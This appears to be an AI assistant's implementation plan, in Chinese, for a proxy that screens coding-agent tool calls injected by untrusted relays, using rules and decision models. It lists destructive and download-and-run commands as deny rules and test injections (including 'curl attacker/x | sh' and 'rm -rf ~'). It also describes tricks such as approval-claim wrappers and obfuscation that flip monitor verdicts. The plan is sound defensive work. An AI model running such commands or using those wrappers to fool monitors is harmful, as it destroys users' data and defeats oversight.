四个方向性问题和四个落地问题都已确定，readiness gate 全部通过。下面是最终实施计划。

# Implementation Plan

## Goal

做一个名为 `auto-mode-proxy` 的网关/代理，部署在 agent（Claude Code CLI/Desktop、Codex CLI/Desktop、腾讯 WorkBuddy）与第三方中转站之间。主模型流量照常走中转站；每个由模型返回的 tool call 在到达 agent 之前，先由代理用可信来源的决策模型（Jev / Clef / OpenAI Decisions，经 OpenRouter、Vercel AI Gateway、Cloudflare AI Gateway 或原生 API）审批，高风险调用被拦截。威胁模型：中转站可以在响应里注入恶意 tool call，并且 agent 自带的 auto mode 审批请求（Claude Code 的 `safeguards` / 客户端 classifier、Codex 的 Auto-review、WorkBuddy 的 AI 智能审批）都走同一个中转站，因此全部不可信。成功标准：带标注评测集上危险命令拦截率 100%、安全命令误拦 ≤ 5%；对纯文本流零可感知延迟；本地一条命令启动，云端一份 compose 启动。

## Confirmed decisions

用户已确认：

| 决策             | 结论                                                                                                                           |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| 拦截动作         | v1 仅拦截（不做挂起等人工审批的 UI）。被拦截的调用替换为说明文本或原生拒绝，写审计日志                                         |
| 审批后端         | 三种都做：System One 家族（Jev via TypeSafe / OpenRouter / Vercel，Clef via Cloudflare）、OpenAI Decisions 格式、灰区 LLM 二审 |
| 技术栈           | TypeScript，Node 24 + Hono                                                                                                     |
| 云端形态         | Docker 镜像 + Caddy 自动 TLS，单租户                                                                                           |
| Claude Code 投递 | 请求带 `safeguards` 时注入代理自己的 `safeguard_results`；否则退回改写 tool_use                                                |
| Classifier 改道  | v1 只改道 Claude Code 的客户端 classifier 请求；Codex / WorkBuddy 的改道留二期                                                 |
| Agent 范围       | 三个都做，按 Claude Code → Codex → WorkBuddy 分阶段                                                                            |
| 凭证模型         | Vault 为主（代理持有中转站 key，agent 用代理 token）；本地 loopback 可选 passthrough                                           |

我按常规默认替用户定下的实现细节（不构成待决项）：

- 配置文件 YAML，路径 `~/.config/auto-mode-proxy/config.yaml`，支持 `${ENV}` 插值与 `--config` 覆盖。
- 默认监听 `127.0.0.1:8484`；云端容器内监听 `0.0.0.0`，但端口不发布，只有 Caddy 发布 443。
- 决策提供方按配置顺序 failover；全部不可用时 fail-closed（拦截并说明原因），可配置为 fail-open。
- 闸门模式 `enforce | shadow`，shadow 只记录不拦截，用于阈值校准。
- 审计日志 JSONL（`~/.local/state/auto-mode-proxy/audit.jsonl`，可配置），不落任何凭证，命令中的密钥先脱敏。
- 包管理用 npm，测试用 vitest，MIT 许可，README 英文 + `README.zh-CN.md`。
- 非目标（v1 不做）：人工审批 UI、多租户、Cloudflare Workers 运行时、基于 hooks 的本地集成、沙箱执行。

## Relevant codebase context

- 仓库 `/root/github.com/EveGoodEvening/auto-mode-proxy` 为空仓库（无提交、无代码），master 分支。唯一文件是调研子代理按全局 CLAUDE.md 的 Lessons 规则新建的 `AGENTS.md`（三条 Codex 文档/源码路径经验，未跟踪），保留并在实现期继续追加 Lessons。
- 本机工具链：Node 24.22.1、Bun 1.4.4、Go 1.27.3、Python 3.12、Docker。
- 全局 CLAUDE.md 约束：云主机上开发端口必须绑定 `127.0.0.1`；浏览器类重活必须经 `heavy-gate`（本项目 e2e 不需要浏览器）。
- 外部协议事实（已核对官方文档/源码，实现时以此为基线）：
  - Claude Code ≥ 2.1.278 走 gateway 时在 `POST /v1/messages` 带 `safeguards: [{type:"dangerous_tool_use", classifier_context:{v:1, permission_mode, live_cwd, trusted_directories,…}}]` 与 beta 头 `dangerous-tool-use-2026-09-03`；响应顶层 `safeguard_results: [{type, status:{type:"available", tool_uses:{<tool_use_id>:{type:"evaluated", outcome:"not_flagged"|"flagged", explanation}}}}]`，流式时在最后一个 `message_delta` 的 `delta` 里。`flagged` 会被原生拒绝并回传原因，连续 3 次或累计 20 次后转人工。拿不到结果（`unsupported`）则退回客户端 classifier 请求：同一 base URL、`system` 首块以 `You are a security monitor for autonomous AI coding agents` 开头、无 `tools`、默认模型 `claude-sonnet-5`。Desktop 不读 `ANTHROPIC_BASE_URL`，需配置"第三方推理网关"。
  - Codex 0.164：仅 Responses API，自定义 provider 默认 HTTP；工具调用从 `response.output_item.done` 执行，忽略 `function_call_arguments.*`；工具为 `exec_command`（`cmd`、`sandbox_permissions`、`justification`）、`write_stdin`、自定义工具 `apply_patch`（自由文本 patch）、历史的 `shell` / `shell_command` / `local_shell_call`、MCP。请求固定 `store:false`，HTTP 下每轮回放完整 `input`。
  - WorkBuddy：自定义模型只接受 OpenAI Chat Completions 完整 URL，`Authorization: Bearer`，SSE，`tools` 由请求定义。
  - 决策模型：System One 请求 `{model, state, questions:{id:{type:noul|choice|score, instructions, criteria}}}`，响应 `answers.{id}.noul`；端点 TypeSafe `https://api.typesafe.ai/v1/systemone`、OpenRouter `https://openrouter.ai/api/v1/systemone` 与 `/api/alpha/decisions`、Vercel `https://ai-gateway.vercel.sh/typesafe/v1/systemone`、Cloudflare `https://api.cloudflare.com/client/v4/accounts/{id}/ai/run/@cf/cloudflare/clef[-flash]`（头 `cf-aig-gateway-id`）。OpenAI Decisions 请求 `{model, input, questions:[{type:predicate|choice|score, name, instructions, choices|levels}]}`，端点 Vercel `/v1/decisions`、OpenAI 原生 `/v1/decisions`。
  - 可信 LLM 端点（二审与改道）：OpenRouter `/api/v1/messages`（模型 `anthropic/claude-haiku-5.5`，必须 `provider:{only:["anthropic"],allow_fallbacks:false}`）、Vercel `/v1/messages`（`providerOptions.gateway.only:["anthropic"]`）、Cloudflare `.../anthropic/v1/messages`（裸模型 ID，`cf-aig-authorization`）。

## Recommended approach

**整体结构**（单进程，Hono on Node）：

```
agent ──HTTP──▶ ingress(route by prefix/path) ──▶ auth(vault|passthrough)
      ◀─SSE──  stream interceptor ◀─────────────── upstream relay
                    │ text/thinking: 直通
                    │ tool call: 缓冲 → Gate → 投递
                    ▼
   Gate = normalize → redact → rules(allow|deny|review) → decision chain → threshold → verdict
   投递 = CC native safeguard_results | rewrite(替换为文本) | shadow(仅记录)
   旁路 = CC classifier 请求指纹匹配 → 改道可信 Anthropic 兼容 provider
```

**方案比较与取舍**

| 方案                                           | 覆盖                                        | 对中转站注入的防御                           | 成本            | 结论                                       |
| ---------------------------------------------- | ------------------------------------------- | -------------------------------------------- | --------------- | ------------------------------------------ |
| A. 响应侧 tool call 闸门（本方案核心）         | 三个 agent、任意权限模式                    | 直接拦截注入的调用                           | 每次 ≈ $0.00003 | 采用                                       |
| B. 只改道 agent 自带 classifier 到可信 LLM     | 仅 Claude Code 客户端 classifier 存在时     | 间接；服务端 `safeguards` 路径仍被中转站控制 | Sonnet 级 token | 作为 A 的补充（仅 CC）                     |
| C. 本地 hooks（PreToolUse）调 Jev              | CC / Codex 有 hooks，WorkBuddy 无           | 可行，但每个 agent 单独装                    | 低              | 非目标，二期可选                           |
| 投递：原生 `safeguard_results` vs 改写         | CC 专属 vs 通用                             | 同等                                         | 同等            | CC 用原生 + 退回改写；Codex/WorkBuddy 改写 |
| 决策格式：System One 一个 adapter 覆盖四条路径 | TypeSafe / OpenRouter / Vercel / Cloudflare |                                              |                 | 一个 adapter + Cloudflare 响应信封解包     |

**闸门策略（policy pack，常量集中在一个模块便于审计）**

1. 确定性规则先行（不调模型）：
   - 只读白名单：用 `shell-quote` 分词，仅当命令的每个管道段程序都在只读集合（`ls cat head tail wc grep rg find git status/log/diff/show pwd echo …`）且无重定向、命令替换、`sudo`、`eval`、`xargs`、`sh -c`、`-delete/-exec` 时直接放行；文件读类工具（Read/Glob/Grep 等）直接放行。
   - 硬拒绝：`rm -rf /`、`rm -rf ~`、`mkfs`、`dd of=/dev/*`、fork bomb、`chmod -R 777 /`、写 `~/.ssh/authorized_keys`、`curl|sh` / `wget|bash` 等明确模式。
   - 敏感路径进入"review"：项目目录外写入；项目内的 `.claude/settings*`、`.claude/hooks`、`.codex/`、`.git/hooks/*`、`.github/workflows/*`、`package.json` scripts、`.env*`、`*.pem`、`*.key`。
   - 发给模型前脱敏：API key、token、密码、私钥块、连接串。
2. 灰区交给决策模型。state 为 JSON 对象 `{action:{tool, command|path+content_excerpt|url, workdir}, environment:{platform, project_dir, trusted_directories, git_branch}, user_request:<最后一条用户消息，截断>}`。不放助手文本、不放 tool result、不放 Codex 的 `justification`（它们是模型/中转站可控文本，JevAdvBench 显示附加"已批准"类文本可翻转约 10% 判定）。
3. 六个正交 noul 问题（均正向措辞，带 true/false criteria）：`destructive`、`exfiltration`、`remote_code_exec`、`security_weakening`、`outside_scope`、`matches_user_request`。
4. 阈值（默认，可配置）：前四项任一 ≥ 0.70 → 拦截；全部 ≤ 0.30 且 `outside_scope` ≤ 0.50 → 放行；其余为灰区 → 走 LLM 二审（Haiku 5.5，结构化 JSON 判定）；二审不可用则拦截。
5. 决策提供方链：按配置顺序 failover（例如 `jev-openrouter → clef-flash-cloudflare → luna-vercel`），每个超时 5 s，429/529 重试一次；全链失败 → fail-closed。
6. 判定缓存：`sha256(归一化动作 + policy 版本)` → 判定，TTL 10 分钟。

**投递语义**

- Claude Code，请求带 `safeguards`（auto mode）：代理默认从转发给中转站的请求里剥掉 `safeguards` 字段及对应 beta 值，丢弃中转站返回的任何 `safeguard_results`，在最后一个 `message_delta` 注入自己的结果；拦截 = `flagged` + `explanation`（含问题名与概率），闸门不可用 = `flagged` + "decision providers unavailable"。非流式响应同理注入顶层字段。
- 其他情况（Claude Code 无 `safeguards`、Codex、WorkBuddy）：改写。Anthropic 格式把该 `tool_use` 块替换为同 index 的 `text` 块，若无剩余 tool_use 则 `stop_reason` 改为 `end_turn`。Responses 格式改写/扣留对应 `response.output_item.done`，替换为 `message` 输出项，并同步修正 `response.completed.output[]`。Chat Completions 格式按 `index` 聚合 `delta.tool_calls`，拦截时丢弃该调用、补发 `delta.content` 说明，`finish_reason` 改为 `stop`。
- 并行多个 tool call 逐个判定；文本和 thinking 事件不缓冲。

**Classifier 改道（仅 Claude Code）**：匹配 `system` 数组中存在以 `You are a security monitor for autonomous AI coding agents` 开头的文本块且无 `tools` 的请求，换凭证转发到配置的可信 Anthropic 兼容 provider，裸模型 ID 映射为网关 slug（Cloudflare passthrough 不映射），`system` 数组（含首位 attribution 块）、`stop_sequences`、`thinking`、`cache_control` 原样保留，响应流原样回传。

**配置示例（节选）**

```yaml
listen: { host: 127.0.0.1, port: 8484 }
auth:
  mode: vault            # vault | passthrough(仅 loopback 允许)
  client_tokens: [ "${AMP_TOKEN_CC}", "${AMP_TOKEN_CODEX}" ]
routes:
  - prefix: /cc        ; protocol: anthropic-messages ; upstream: relay-a
  - prefix: /codex     ; protocol: openai-responses   ; upstream: relay-b
  - prefix: /workbuddy ; protocol: openai-chat        ; upstream: relay-b
upstreams:
  relay-a: { base_url: https://relay.example.com, api_key: "${RELAY_A_KEY}", forward_safeguards: false }
  relay-b: { base_url: https://relay2.example.com/v1, api_key: "${RELAY_B_KEY}" }
gate:
  mode: enforce          # enforce | shadow
  on_provider_failure: block
decision:
  chain: [jev-openrouter, clef-cf, luna-vercel]
  providers:
    jev-openrouter: { kind: systemone, base_url: https://openrouter.ai/api/v1, api_key: "${OPENROUTER_API_KEY}", model: typesafe/jev-1.14 }
    clef-cf:        { kind: systemone, base_url: https://api.cloudflare.com/client/v4/accounts/${CF_ACCOUNT_ID}/ai/run/@cf/cloudflare/clef-flash, api_key: "${CF_API_TOKEN}", headers: { cf-aig-gateway-id: default }, model: clef-flash, envelope: cloudflare }
    luna-vercel:    { kind: openai-decisions, base_url: https://ai-gateway.vercel.sh/v1, api_key: "${AI_GATEWAY_API_KEY}", model: openai/gpt-6-luna-decisions }
  second_stage: { kind: anthropic-messages, base_url: https://openrouter.ai/api/v1, api_key: "${OPENROUTER_API_KEY}", model: anthropic/claude-haiku-5.5, pin: { provider: { only: [anthropic], allow_fallbacks: false } } }
classifier_reroute: { enabled: true, provider: second_stage }
```

## Implementation steps

**Phase 0：脚手架**
1. 初始化 npm 项目（TypeScript 5、`hono`、`@hono/node-server`、`zod`、`yaml`、`pino`、`eventsource-parser`、`shell-quote`、`partial-json`、`vitest`、`tsx`、`tsup`）。目录：`src/{cli,server,routes,auth,protocols,gate,decision,policy,audit,config}`、`eval/`、`docs/`、`deploy/`。
2. `src/config`：zod schema + YAML 加载 + `${ENV}` 插值 + 校验错误提示；`auto-mode-proxy check` 校验配置并对每个决策提供方发一个固定 canary 问题。
3. CLI 骨架：`init`（交互式生成配置、签发 token、打印三种 agent 的接入片段）、`serve`、`check`、`eval`、`audit tail`、`token new`。

**Phase 1：直通代理与 Anthropic Messages 适配器**
4. 路由：按 `prefix` 匹配 route，无前缀时按路径推断协议（`/v1/messages*` → anthropic，`/v1/responses` → responses，`/v1/chat/completions` → chat）；未知路径对该 upstream 字节级直通。
5. 认证：vault 模式校验客户端 token（常量时间比较），转发时替换 `Authorization` / `x-api-key` 为 upstream 凭证；passthrough 模式仅当监听地址为 loopback 时允许，否则启动失败。转发保留除 hop-by-hop 外全部头（含 `anthropic-version`、`anthropic-beta`、`x-claude-code-*`），响应头原样回传（`retry-after`、限流头），错误体不改写。
6. 请求体：仅解析不修改时按原字节转发；需要修改（剥 `safeguards`、改道换模型）才重新序列化。
7. SSE 拦截器（通用层）：基于 Web Streams 的事件解析/再编码，直通 `ping`；为 Anthropic 格式实现 `tool_use` 块缓冲（`content_block_start` 到 `content_block_stop`），`input_json_delta` 拼接后 `JSON.parse`，失败时用 `partial-json` 容忍解析，仍失败则视为不可判定（拦截）。
8. 验证：录制 fixture（文本、thinking、单/多 tool_use、ping、错误事件）做单元测试；用 mock upstream 跑 Claude Code 实机会话，确认直通时行为与无代理一致（含 prompt cache 命中，看 `cache_read_input_tokens` 不为 0）。

**Phase 2：闸门引擎与 System One 适配器**
9. `src/gate/normalize`：把三种协议的 tool call 归一化为 `Action{kind: command|file_write|url|mcp|other, tool, argv/text, paths, workdir, raw}`；Claude Code 工具名映射表；Codex 的 `exec_command/shell/shell_command/local_shell_call/write_stdin/apply_patch`（解析 `*** Add/Update/Delete File:` 得到路径）；WorkBuddy 按 route 的 `tool_map` 加启发式（工具名/描述含 shell/command/terminal/execute；参数含 path+content 视为写文件）。
10. `src/policy`：只读白名单、硬拒绝、敏感路径、脱敏，全部为纯函数并有表驱动测试；policy 带 `version` 字段参与缓存键。
11. `src/decision/systemone`：构造 state 与六个 noul 问题；适配 TypeSafe / OpenRouter / Vercel / Cloudflare 四种 URL、鉴权头、模型名与 Cloudflare `{result,success,errors}` 信封；超时、重试、429/529 处理；返回统一 `Answers`。
12. `src/gate/decide`：规则 → 缓存 → 决策链 → 阈值真值表 → `Verdict{allow|block|uncertain, reasons, probabilities, provider, latency, cost}`；`uncertain` 在 Phase 4 前按 block 处理。
13. `src/audit`：JSONL 追加写（含 route、协议、会话头、脱敏后的动作、规则命中、各问题概率、判定、投递方式、延迟、token 与成本估算）；`audit tail` 命令。
14. 验证：对 OpenRouter `/api/v1/systemone` 确认接受的模型 ID 形式（`typesafe/jev-1.14` 还是 `jev-latest`）；若 `/systemone` 拒绝，则该 provider 改用 `/api/alpha/decisions`（同 schema，多 `provider` 路由字段）。对 Cloudflare 确认 REST 返回是否带信封；若直接返回 System One 响应，则 `envelope: cloudflare` 设为可选自动探测。

**Phase 3：Claude Code 投递与改道**
15. `safeguards` 处理：请求有该字段时记录 `classifier_context`（取 `live_cwd`、`trusted_directories` 入 state），按 upstream 配置剥除字段与 beta 值；响应里丢弃中转站的 `safeguard_results`；扣留最后一个 `message_delta` 直到所有 tool_use 判定完成，注入 `safeguard_results`（`available` + 每个 `tool_use_id` 的 `evaluated` 结果）；期间每 5 s 发送 `ping` 保活。
16. 改写模式（请求无 `safeguards`）：按 Phase 1 的缓冲，把拦截的 `tool_use` 替换为同 index 的 `text` 块（内容为可读的拦截说明），必要时 `stop_reason` 改 `end_turn`；非流式响应同步处理。
17. 改道：实现指纹匹配与可信 provider 转发（模型 ID 映射表：裸 ID → OpenRouter / Vercel slug；Cloudflare 不映射），`classifier_reroute.enabled=false` 时直通中转站；对未匹配但疑似 classifier 的请求（无 tools 且 `stop_sequences` 含 `</block>`/`</severity>`）只记录日志。
18. 验证（真实 Claude Code ≥ 2.1.311，相同账号）：
    - 用会注入 `curl attacker/x | sh` 的 mock 中转站跑 auto mode：确认 `/status` 显示 `Auto mode server: Enabled`，注入调用被原生拒绝且模型收到说明；连续 3 次后出现人工确认提示。
    - 若 Claude Code 对注入的 `safeguard_results` 不认（表现为 `unsupported` 退回客户端 classifier），则改写模式自动生效，并把该版本号记入 `docs/compat.md`。
    - 改写模式下连续多轮对话必须成功：若中转站返回 400 且提及 `signature`/`prefix`，则在改写的那条响应里同时去掉 `thinking` 块，并在后续请求中剔除该轮的 thinking 块后重试。
    - 剥 `safeguards` 后若某中转站返回 400 提及 beta 值，则连同 `anthropic-beta` 中的 `dangerous-tool-use-2026-09-03` 一起剥除（已作为默认行为，需确认不剥也可用则提供开关）。
    - Desktop 版：在"第三方推理网关"填 `http://127.0.0.1:8484/cc`；若不接受 loopback 则记录为已知限制并建议通过云端 https 地址接入。
19. 文档 `docs/agents/claude-code.md`：CLI 环境变量（`ANTHROPIC_BASE_URL`、`ANTHROPIC_AUTH_TOKEN`、`ANTHROPIC_API_KEY=""`、建议 `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`）、Desktop 配置、`CLAUDE_CODE_AUTO_MODE_MODEL=claude-haiku-5-5` 降低改道成本的提示。

**Phase 4：OpenAI Decisions 适配器与 LLM 二审**
20. `src/decision/openai-decisions`：同一问题集映射为 `predicate` 数组请求，适配 Vercel `/v1/decisions` 与 OpenAI 原生；响应 `answers[]` 按 `name` 回填为统一 `Answers`。
21. `src/decision/llm-review`：Anthropic Messages 请求（Haiku 5.5，`output_config.format` JSON schema 输出 `{verdict, reason}`），输入为 state JSON 与一阶段概率，带网关 pin 参数；若该网关拒绝 `output_config.format`，退回"指令要求仅输出 JSON + 严格解析，解析失败视为 block"。
22. 把 `uncertain` 接入二审；审计记录两阶段成本。

**Phase 5：Codex（OpenAI Responses）适配器**
23. SSE 拦截：维护 `output_index → item` 状态，缓冲 `function_call` / `custom_tool_call` / `local_shell_call` 项（用 `arguments.delta` 做早期分析，但以 `output_item.done` 为判定点）；拦截时把该项替换为 `message` 项（`output_text` 说明），重写 `response.completed.output[]` 与 `sequence_number` 单调性；非流式同理。
24. 验证（真实 Codex CLI 与桌面版，共用 config.toml）：mock 中转站注入 `exec_command{cmd:"rm -rf ~", sandbox_permissions:"require_escalated"}`，在 `--yolo` 与 `Approve for me` 两种模式下都被拦截；确认下一轮带回放 `input` 的请求不被上游拒绝（若 OpenAI 侧对 `reasoning` 加密项与后续项有一致性校验而报错，则改为同时丢弃该轮的 `reasoning` 项）。
25. 文档 `docs/agents/codex.md`：`[model_providers.amp]`（`base_url=http://127.0.0.1:8484/codex/v1`、`env_key`、`wire_api="responses"`、`supports_websockets=false`）与 `model_provider="amp"`。

**Phase 6：WorkBuddy（OpenAI Chat Completions）适配器**
26. SSE 拦截：按 `choices[0].delta.tool_calls[].index` 聚合 `function.arguments`，流末判定；拦截时丢弃该调用、追加 `delta.content` 说明、`finish_reason` 改 `stop`；透传 `reasoning_content`、`usage`。
27. `tool_map` 配置与启发式识别；Windows 路径归一化。
28. 验证：真实 WorkBuddy 自定义模型填 `http://127.0.0.1:8484/workbuddy/v1/chat/completions`，开启"AI 智能审批 = 自动审批"且不在"完全访问"模式，注入命令被拦截。若请求头里能观察到 `X-Agent-Type: auxiliary`，记入 `docs/compat.md` 供二期改道使用。
29. 文档 `docs/agents/workbuddy.md`（中文为主）。

**Phase 7：评测与校准**
30. `eval/cases.jsonl`：≥ 150 条带标签动作，类别：只读、构建/测试、项目内修改、系统变更、破坏性、外传、下载即执行、削弱安全、项目外写入，以及对抗样本（命令中夹带"owner approved"、善意包装、base64 混淆、复合管道）。可引入 MIT 许可的公开用例并注明来源。
31. `auto-mode-proxy eval`：对配置的每个 provider 跑全集，输出拦截率、误拦率、灰区比例、p50/p95 延迟、总成本；CI 门槛：危险类拦截率 100%，安全类误拦 ≤ 5%。
32. 注入套件：同一命令三种包装（干净、直接覆盖指令、权威声明），报告翻转率；若任何危险命令在包装后放行，则把该模式加入硬拒绝或敏感规则。
33. `docs/tuning.md`：shadow 模式一周校准流程、阈值调整原则（提高 yes 阈值降低误拦，降低阈值提高召回，不要对少量样本过拟合）。

**Phase 8：打包、部署、加固**
34. npm 发布配置（bin `auto-mode-proxy`），`tsup` 构建；可选 `bun build --compile` 单文件二进制。
35. `deploy/Dockerfile`（多阶段，非 root 用户）、`deploy/docker-compose.yml`（proxy + Caddy，Caddyfile 自动 TLS，proxy 端口不发布）、GitHub Actions 构建推送 GHCR。
36. 加固：非 loopback 监听必须配置 client token；请求体上限；上游超时；`trust_proxy` 处理 `X-Forwarded-For`；日志与审计全程不含凭证；`/_amp/status` 仅 loopback 或管理 token 可访问。
37. 文档：README（EN/中文）、`docs/threat-model.md`（含明确的非目标：不防中转站篡改文本内容、不是沙箱、决策模型可被欺骗故以规则与 fail-closed 兜底）、`docs/compat.md`（各 agent 版本验证矩阵）。

## Validation plan

- 单元测试：三种协议的 SSE 解析/改写（录制 fixture，含并行调用、ping、错误、容忍 JSON）；规则引擎表驱动测试；脱敏；归一化（含 `apply_patch` 路径解析）；三类决策 adapter 的请求/响应编解码（mock HTTP）。
- 集成测试：内置 mock 中转站（可配置在响应中注入恶意 tool call）+ mock 决策 provider，覆盖 enforce/shadow、vault/passthrough、provider 全挂 fail-closed、缓存命中、`safeguards` 注入与改写两条投递路径。
- 实机验证清单（人工，记录到 `docs/compat.md`）：Claude Code CLI 与 Desktop、Codex CLI 与桌面版、WorkBuddy，各自执行 Phase 3/5/6 的验证步骤。
- 评测门槛：Phase 7 的拦截率/误拦率在 CI 中强制；每次修改 policy 常量必须重跑并更新报告。
- 性能预算：纯文本流经代理的额外延迟 < 5 ms；带 tool call 的响应末尾额外等待 p95 ≤ 1.5 s（Jev）或 ≤ 0.5 s（Clef-flash）。
- 安全检查：`ss -ltnp` 确认默认只监听 127.0.0.1；云端只有 Caddy 443 对外；grep 审计与日志无 token/key 明文。
- 成本核算：从审计日志汇总每日决策成本，README 给出估算（每 100 次判定约 $0.003，灰区二审约每次 $0.0002）。

## Risks and mitigations

- `safeguards` / `safeguard_results` 尚未进入公开 API 参考，字段可能变动：实现为特性探测（请求无该字段即改写模式），字段名集中在一个模块，fixture 带 Claude Code 版本号；`docs/compat.md` 记录验证过的版本。
- Classifier 指纹（system 首行）漂移：匹配失败只会退化为"该请求走中转站"，不影响闸门；提供配置覆盖，并对疑似请求打日志。
- 决策模型可被欺骗（文献约 10% 翻转）：规则先行、state 不含模型文本、灰区二审、fail-closed、注入评测进 CI。
- 改写助手轮次触及 Claude 5.x 的 preserved thinking 校验：优先用原生 `safeguard_results`（不改历史）；改写模式按 Phase 3 的验证分支去除 thinking 块。
- Codex 改写后的 `input` 回放与加密 reasoning 一致性：Phase 5 验证分支（必要时同时丢弃 reasoning 项）。
- 中转站拒绝被剥字段或多余 beta 值：按 upstream 开关控制剥除粒度，错误体原样回传便于定位。
- 决策提供方不可用或限流：多提供方 failover、重试、缓存；最终 fail-closed 且说明原因，可配置 fail-open。
- Desktop 版 Claude 可能不接受 loopback 网关或关闭 beta 特性：退回改写模式；文档给出云端 https 接入路径。
- WorkBuddy 工具名未知：`tool_map` + 启发式，默认把无法分类的带 `command`/`path` 参数的工具视为需审批。
- 隐私：命令与路径会发送给第三方决策提供方：默认脱敏、文档提示 ZDR 选项（Vercel 可 ZDR + 第一方；OpenRouter 的 ZDR 与第一方 Anthropic 互斥；Cloudflare 的 ZDR 仅 Unified Billing）。
- 延迟：只在 tool call 处等待，文本直通；Clef-flash 作为低延迟备选。